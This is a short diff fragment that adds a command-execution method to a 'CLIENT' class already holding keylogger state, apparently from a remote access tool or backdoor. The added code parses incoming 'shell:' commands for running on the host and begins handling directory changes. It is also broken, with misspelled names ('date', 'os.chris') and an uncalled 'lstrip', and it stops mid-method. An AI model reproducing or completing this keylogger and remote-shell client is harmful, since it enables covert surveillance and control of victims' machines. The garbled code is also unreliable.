@@ -54,3 +54,14 @@ class CLIENT:
                 t.start()
         else:
             self.KEYLOGGER_STATUS = False
+
+
+        def execute(self, command):
+            data = command.decode('utf-8').split(":")
+
+            if data[0] == "shell":
+                toexecute = date[1].rstrip(" ").lstrip
+                toexecute = "".join(toexecute.split())
+                if toexecute.split(" ")[0] == "cd":
+                    try:
+                        os.chris(toexecute.split(" ")[1])
